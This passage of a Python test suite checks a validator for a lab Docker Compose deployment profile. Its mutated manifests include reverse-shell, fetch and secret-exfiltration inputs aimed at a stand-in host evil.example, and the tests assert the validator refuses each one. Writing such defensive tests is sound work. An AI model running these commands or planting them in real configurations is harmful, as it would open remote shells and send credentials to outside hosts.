    del _api(marker)["build"]
    assert "GAP marker" in rule_images(marker, [*SAMPLE_VERIFIED, RETIRED_MARKER])
    swapped = sample()
    swapped["services"]["space-mongo"]["image"] = REDIS_IMAGE
    assert rule_images(swapped, SAMPLE_VERIFIED)


def test_control_refuses_an_unverified_space_api_version():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    other = "example.invalid/space-api:1.8.0@sha256:" + "cd" * 32
    manifest = sample()
    _api(manifest)["image"] = other
    del _api(manifest)["build"]
    message = rule_images(manifest, [*SAMPLE_VERIFIED, other])
    assert message and "1.7.1" in message


def test_control_refuses_cache_and_heap_changes():
    # [utest->req~lab-deployment-pricing-profile-memory-budget~2]
    manifest = sample()
    _boot(manifest)["mem_limit"] = "128m"
    assert "expected" in rule_memory(manifest, 1120), "a limit changed with a consistent documented sum"
    big = sample()
    big["services"]["space-mongo"]["mem_limit"] = "640m"
    assert "ceiling" in rule_memory(big, 1216)
    no_limit = sample()
    del _api(no_limit)["mem_limit"]
    assert "whole m or g" in rule_memory(no_limit, 1088)
    no_boot_limit = sample()
    del _boot(no_boot_limit)["mem_limit"]
    assert "whole m or g" in rule_memory(no_boot_limit, 1088)
    assert "runbook" in rule_memory(sample(), 992), "a runbook that still documents 992 MiB"
    assert "runbook" in rule_memory(sample(), 1000), "the runbook sum must equal the manifest sum"
    over = sample()
    over["services"]["space-mongo"]["mem_limit"] = "1024m"
    assert "ceiling" in rule_memory(over, 1600), "above 1152 with the documented sum equal to the manifest sum"
    for service, old, new in [("space-mongo", "--wiredTigerCacheSizeGB", "--other"),
                              ("space-mongo", "0.25", "0.5"), ("space-redis", "64mb", "80mb")]:
        changed = sample()
        changed["services"][service]["command"] = [
            p.replace(old, new) for p in changed["services"][service]["command"]]
        assert rule_memory(changed, 1088), (service, new)
    missing = sample()
    missing["services"]["space-mongo"]["command"] = ["mongod"]
    assert "missing" in rule_memory(missing, 1088)
    heap = sample()
    _env_of(heap)["NODE_OPTIONS"] = "--max-old-space-size=256"
    assert "differs" in rule_memory(heap, 1088)
    no_heap = sample()
    _env_of(no_heap)["NODE_OPTIONS"] = ""
    assert "missing" in rule_memory(no_heap, 1088)


def _check_secrets(manifest: dict):
    return rule_secrets(manifest, {r[2:-1] for r in SECRET_REFERENCES})


def test_control_refuses_defaulted_or_literal_secrets():
    # [utest->req~lab-deployment-pricing-profile-secret-references~2]
    names = {r[2:-1] for r in SECRET_REFERENCES}
    for key, value in [("JWT_SECRET", "${DEMO_SPACE_JWT_SECRET:-dev}"), ("ADMIN_PASSWORD", "changeme"),
                       ("JWT_SALT", "pepper")]:
        manifest = sample()
        _env_of(manifest)[key] = value
        assert _check_secrets(manifest), key
    message = rule_secrets(sample(), names - {"DEMO_SPACE_JWT_SALT"})
    assert message and "does not document" in message, "an undocumented variable"


def test_control_refuses_unbraced_or_swapped_secret_references():
    # [utest->req~lab-deployment-pricing-profile-secret-references~2]
    unbraced = sample()
    _env_of(unbraced)["ADMIN_USER"] = "$DEMO_PG_PASSWORD"
    assert "'$'" in _check_secrets(unbraced)
    doubled = sample()
    _env_of(doubled)["ADMIN_USER"] = "a$$b"
    assert "'$'" in _check_secrets(doubled)
    uri = sample()
    _env_of(uri)["MONGO_URI"] = "mongodb://root:${DEMO_SPACE_JWT_SECRET}@space-mongo:27017/space"
    assert "MONGO_URI" in _check_secrets(uri)
    swapped = sample()
    _env_of(swapped)["ADMIN_PASSWORD"] = "${DEMO_SPACE_JWT_SECRET}"
    assert "wrong reference" in _check_secrets(swapped)
    root = sample()
    _env_of(root, "space-mongo")["MONGO_INITDB_ROOT_PASSWORD"] = "${DEMO_SPACE_ADMIN_PASSWORD}"
    assert "wrong reference" in _check_secrets(root)
    absent = sample()
    del _env_of(absent)["JWT_SALT"]
    assert "missing" in _check_secrets(absent)
    proxied = sample()
    _env_of(proxied)["MONGO_URI"] = MONGO_URI + "&proxyHost=evil.example"
    assert "MONGO_URI must be exactly" in _check_secrets(proxied)
    literal = sample()
    _env_of(literal)["MONGO_URI"] = "mongodb://root:hunter2@space-mongo:27017/space"
    assert "MONGO_URI" in _check_secrets(literal)
    requirepass = sample()
    requirepass["services"]["space-redis"]["command"] += ["--requirepass", "x"]
    assert "command" in _check_secrets(requirepass)
    for key, value in [("ADMIN_USER", "${DEMO_SPACE_ADMIN_PASSWORD}"),
                       ("WEBHOOK_URL", "https://sphere.score.us.es/?k=${DEMO_SPACE_JWT_SECRET}")]:
        copied = sample()
        _env_of(copied)[key] = value
        assert "must appear" in _check_secrets(copied), key
    shaped = sample()
    _env_of(shaped)["ADMIN_USER"] = "sk-" + "a" * 20
    assert "secret-shaped" in _check_secrets(shaped)


def test_control_pins_the_admin_password_to_its_two_places():
    # [utest->req~lab-deployment-pricing-profile-secret-references~2]
    assert _check_secrets(sample()) is None, "the reference in both places passes"
    third = sample()
    _env_of(third)["ADMIN_USER"] = ADMIN_PASSWORD_REFERENCE
    assert "must appear 2 time(s)" in _check_secrets(third)
    in_url = sample()
    _env_of(in_url, "pricing-bootstrap")["SPACE_URL"] = "http://lab:${DEMO_SPACE_ADMIN_PASSWORD}@space-api:3000"
    assert "must appear 2 time(s)" in _check_secrets(in_url)
    missing = sample()
    del _env_of(missing, "pricing-bootstrap")["SPACE_ADMIN_PASSWORD"]
    assert "pricing-bootstrap:SPACE_ADMIN_PASSWORD is missing" == _check_secrets(missing)
    literal = sample()
    _env_of(literal, "pricing-bootstrap")["SPACE_ADMIN_PASSWORD"] = "changeme"
    assert _check_secrets(literal)
    swapped = sample()
    _env_of(swapped, "pricing-bootstrap")["SPACE_ADMIN_PASSWORD"] = "${DEMO_SPACE_JWT_SECRET}"
    assert "wrong reference" in _check_secrets(swapped)


def test_control_refuses_a_started_only_dependency():
    # [utest->req~lab-deployment-pricing-profile-start-order~2]
    manifest = sample()
    _api(manifest)["depends_on"]["space-mongo"] = {"condition": "service_started"}
    assert rule_start_order(manifest)


def _no_depends(m): del _boot(m)["depends_on"]
def _boot_started(m): _boot(m)["depends_on"]["space-api"]["condition"] = "service_started"
def _boot_completed(m): _boot(m)["depends_on"]["space-api"]["condition"] = "service_completed_successfully"
def _boot_extra(m): _boot(m)["depends_on"]["space-mongo"] = {"condition": "service_healthy"}


@pytest.mark.parametrize("mutate", [_no_depends, _boot_started, _boot_completed, _boot_extra],
                         ids=lambda f: f.__name__)
def test_control_refuses_a_bootstrap_started_too_early(mutate):
    # [utest->req~lab-deployment-pricing-profile-start-order~2]
    manifest = sample()
    mutate(manifest)
    assert "pricing-bootstrap must wait" in rule_start_order(manifest)


def test_control_exempts_the_one_shot_from_the_healthcheck_rule():
    # [utest->req~lab-deployment-pricing-profile-start-order~2]
    assert "healthcheck" not in _boot(sample())
    assert rule_start_order(sample()) is None


def _extra_proxy(m): _env_of(m, "pricing-bootstrap")["HTTPS_PROXY"] = "http://proxy.example:3128"
def _extra_proxy_lower(m): _env_of(m, "pricing-bootstrap")["https_proxy"] = "http://proxy.example:3128"
def _extra_http_proxy(m): _env_of(m, "pricing-bootstrap")["HTTP_PROXY"] = "http://proxy.example:3128"
def _extra_sphere_key(m): _env_of(m, "pricing-bootstrap")["SPHERE_API_KEY"] = "${DEMO_SPHERE_API_KEY}"
def _extra_plan(m): _env_of(m, "pricing-bootstrap")["SPACE_BOOTSTRAP_PLAN"] = "PRO"
def _url_changed(m): _env_of(m, "pricing-bootstrap")["SPACE_URL"] = "https://space.score.us.es"
def _user_changed(m): _env_of(m, "pricing-bootstrap")["SPACE_ADMIN_USER"] = "admin"
def _user_missing(m): del _env_of(m, "pricing-bootstrap")["SPACE_ADMIN_USER"]
def _password_missing(m): del _env_of(m, "pricing-bootstrap")["SPACE_ADMIN_PASSWORD"]


@pytest.mark.parametrize("mutate", [_extra_proxy, _extra_proxy_lower, _extra_http_proxy, _extra_sphere_key,
                                    _extra_plan, _url_changed, _user_changed, _user_missing, _password_missing],
                         ids=lambda f: f.__name__)
def test_control_refuses_a_changed_bootstrap_surface(mutate):
    # [utest->req~lab-deployment-pricing-profile-bootstrap-environment~1]
    manifest = sample()
    mutate(manifest)
    assert "pinned" in rule_bootstrap_surface(manifest)


def test_control_refuses_a_missing_bootstrap_service():
    # [utest->req~lab-deployment-pricing-profile-bootstrap-environment~1]
    manifest = sample()
    _without_bootstrap(manifest)
    assert "missing" in rule_bootstrap_surface(manifest)


def test_control_allows_the_bootstrap_url_host():
    # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
    assert _env_of(sample(), "pricing-bootstrap")["SPACE_URL"] == "http://space-api:3000"
    assert rule_remote_sphere(sample()) is None


def test_control_refuses_a_service_without_a_healthcheck():
    # [utest->req~lab-deployment-pricing-profile-start-order~2]
    no_check = sample()
    del no_check["services"]["space-redis"]["healthcheck"]
    assert "space-redis has no healthcheck" == rule_start_order(no_check)
    empty = sample()
    empty["services"]["space-mongo"]["healthcheck"]["test"] = []
    assert "space-mongo has no healthcheck" == rule_start_order(empty)
    one = sample()
    _api(one)["depends_on"] = {"space-mongo": {"condition": "service_healthy"}}
    assert "must wait" in rule_start_order(one)
    none = sample()
    none["services"]["space-redis"]["healthcheck"] = {"test": ["NONE"]}
    assert "disabled" in rule_start_order(none)
    disabled = sample()
    disabled["services"]["space-mongo"]["healthcheck"]["disable"] = True
    assert "disabled" in rule_start_order(disabled)


def test_control_refuses_a_local_sphere():
    # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
    manifest = sample()
    _env_of(manifest)["SPHERE_API_URL"] = "http://sphere:8080/api/v1"
    assert rule_remote_sphere(manifest)


def test_control_refuses_a_foreign_host_in_any_url_scheme():
    # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
    uri = "mongodb://space:${DEMO_SPACE_MONGO_PASSWORD}@evil.example/space_db"
    for key, value in [("WEBHOOK_URL", "https://hooks.example.org/x"),
                       ("WEBHOOK_URL", "https://sphere.score.us.es@evil.example/x"),
                       ("WEBHOOK_URL", "https://hooks.example.org/x?u=a@b"),
                       ("WEBHOOK_URL", "https://evil.example/x?u=a@sphere.score.us.es"),
                       ("WEBHOOK_URL", "HTTPS://evil.example/x"),
                       ("MONGO_URI", uri), ("REDIS_URL", "redis://evil.example:6379"),
                       ("MONGO_URI", "mongodb://space:${DEMO_SPACE_MONGO_PASSWORD}@space-mongo:27017,evil.example:27017/s"),
                       ("MONGO_URI", "mongodb://space-mongo:27017,[::2]:27017/s"),
                       ("WEBHOOK_URL", "https://evil.example\\@sphere.score.us.es/x"),
                       ("WEBHOOK_URL", "https://sphere.score.us.es\t@evil.example/x")]:
        manifest = sample()
        _env_of(manifest)[key] = value
        message = rule_remote_sphere(manifest)
        assert message and "external address" in message, (key, value)
    health = sample()
    _api(health)["healthcheck"]["test"] = ["CMD-SHELL", "wget -qO- http://evil.example/x || exit 1"]
    assert "external address" in rule_remote_sphere(health)
    # a ${...} password in the userinfo and the local healthcheck address stay allowed
    assert rule_remote_sphere(sample()) is None
    query = sample()
    _env_of(query)["WEBHOOK_URL"] = "https://sphere.score.us.es/x?u=a@b"
    assert rule_remote_sphere(query) is None
    hosts = sample()
    _env_of(hosts)["MONGO_URI"] = "mongodb://space:${DEMO_SPACE_MONGO_PASSWORD}@space-mongo:27017,127.0.0.1:27017/s"
    assert rule_remote_sphere(hosts) is None, "every listed host is allowed"
    unparsable = sample()
    _env_of(unparsable)["WEBHOOK_URL"] = "http://[evil/x"
    assert "unparsable" in rule_remote_sphere(unparsable)


def test_control_pins_the_api_environment_and_healthcheck():
    # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
    proxy = sample()
    _env_of(proxy)["HTTP_PROXY"] = "evil.example:3128"
    assert "environment keys" in rule_api_surface(proxy)
    dropped = sample()
    del _env_of(dropped)["SERVER_PORT"]
    assert "environment keys" in rule_api_surface(dropped)
    require = sample()
    _env_of(require)["NODE_OPTIONS"] = "--require /tmp/x.js --max-old-space-size=192"
    assert "NODE_OPTIONS" in rule_api_surface(require)
    for url in ("redis://:${DEMO_SPACE_ADMIN_PASSWORD}@space-redis:6379", "redis://user:pw@space-redis:6379",
                "redis://space-redis:6379,evil.example:6379"):
        redis = sample()
        _env_of(redis)["REDIS_URL"] = url
        assert "REDIS_URL" in rule_api_surface(redis), url
    health = sample()
    _api(health)["healthcheck"]["test"] = ["CMD-SHELL", "wget -qO- http://evil.example/x || exit 1"]
    assert "healthcheck" in rule_api_surface(health)
    gone = sample()
    del _api(gone)["healthcheck"]
    assert "healthcheck" in rule_api_surface(gone)
    replica = sample()
    replica["services"]["space-redis"]["command"] += ["--replicaof", "evil.example", "6379"]
    assert "space-redis command" in rule_api_surface(replica)
    mongo_command = sample()
    mongo_command["services"]["space-mongo"]["command"] += ["--bind_ip_all"]
    assert "space-mongo command" in rule_api_surface(mongo_command)
    shell = sample()
    _api(shell)["command"] = ["sh", "-c", "nc evil.example 4444 -e /bin/sh"]
    assert "without a command" in rule_api_surface(shell)
    mongo_check = sample()
    mongo_check["services"]["space-mongo"]["healthcheck"]["test"] = ["CMD-SHELL", "nc evil.example 4444 -e /bin/sh"]
    assert "space-mongo healthcheck" in rule_api_surface(mongo_check)
    redis_check = sample()
    redis_check["services"]["space-redis"]["healthcheck"]["test"] = ["CMD", "redis-cli", "-h", "evil.example", "ping"]
    assert "space-redis healthcheck" in rule_api_surface(redis_check)


def test_control_runbook_parsers_refuse_malformed_text():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    good = _good_runbook()
    assert verified_images(good) == [MONGO_IMAGE, REDIS_IMAGE] and documented_sum(good) == 1088
    truncated = good.replace(MONGO_IMAGE, MONGO_IMAGE[:-1]).replace(REDIS_IMAGE, REDIS_IMAGE[:-1])
    assert verified_images(truncated) == [], "a truncated digest is not 64 hex"
    outside = good.replace("## Verified image references", "## Candidates")
    assert verified_images(outside) == [], "verified lines outside the section"
    assert verified_images(good.replace(" - verified 2026-10-24", " - pending")) == []
    assert verified_images(good.replace(" - verified 2026-10-24", " - verified")) == []
    assert verified_images(good.replace("## Verified image references", "## Candidates")) == []
    assert documented_sum(good.replace("Memory sum:", "Total:")) is None


def test_control_runbook_rule_refuses_a_gap_and_a_wrong_wiring():
    # [utest->req~lab-deployment-pricing-profile-pinned-images~2]
    digests = set(DIGESTS)
    good = _good_runbook()
    assert rule_runbook(good, digests) is None
    assert "GAP" in rule_runbook(good + "\n## GAP\n\n- space-api has no image\n", digests)
    extra = good.replace("\n## Built images", f"- `example.invalid/x:1@sha256:{'44' * 32}` - verified 2026-10-24\n\n## Built images")
    assert "verified list" in rule_runbook(extra, digests)
    assert "verified list" in rule_runbook(good.replace(f"- `{REDIS_IMAGE}` - verified 2026-10-24\n", ""), digests)
    assert "space-api:1.7.1" in rule_runbook(good.replace("openbinding-lab/space-api:1.7.1", "space-api"), digests)
    assert "lab/space" in rule_runbook(good.replace("`lab/space`", "`lab/tools`"), digests)
    assert "pricing-bootstrap:1" in rule_runbook(good.replace("pricing-bootstrap:1", "pricing-bootstrap"), digests)
    assert "lab/tools" in rule_runbook(good.replace("`lab/tools`", "`lab/space`"), digests)
    for digest in DIGESTS:
        assert "UNVERIFIED" in rule_runbook(good.replace(f"sha256:{digest}` UNVERIFIED", f"sha256:{digest}`"), digests)
        listed = good.replace("\n## Built images", f"- `x:1@sha256:{digest}` - verified 2026-10-24\n\n## Built images")
        assert "verified list" in rule_runbook(listed, digests)
    assert "UNVERIFIED" in rule_runbook(good, {*digests, "55" * 32}), "a base digest the runbook lacks"
    assert "GAP" in rule_runbook(good + "\n## GAP (closed)\n\n- x\n", digests)
    inside = good.replace("\n## Built images", f"- base `sha256:{DIGESTS[0]}` UNVERIFIED\n\n## Built images")
    assert "verified list" in rule_runbook(inside, digests), "an UNVERIFIED line inside the verified section"
